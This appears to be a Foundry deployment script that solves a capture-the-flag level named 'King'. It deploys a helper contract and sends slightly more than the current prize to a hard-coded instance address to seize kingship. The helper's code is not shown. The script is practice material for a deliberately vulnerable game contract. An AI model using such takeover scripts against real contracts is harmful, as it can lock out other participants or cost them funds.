// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {King} from "../src/Level10King.sol";
import {KingHelper} from "../src/Level10KingHelper.sol";
import {Script, console} from "forge-std/Script.sol";

// the kindom will be captured by KingHelper contract

contract Level10KingSolv is Script {
    function run() external {
        uint256 ammount;
        address payable _king = payable( /*instance address*/ 0x1009c457113feA78076241131b94ddD5D88fB7eF);

        vm.startBroadcast();

        King king = King(_king);
        KingHelper kingHelper = new KingHelper();

        console.log(address(this));

        ammount = (king.prize() + 0.00001 ether);
        kingHelper.getKingship{value: ammount}();

        console.log(king._king());

        vm.stopBroadcast();
    }
}
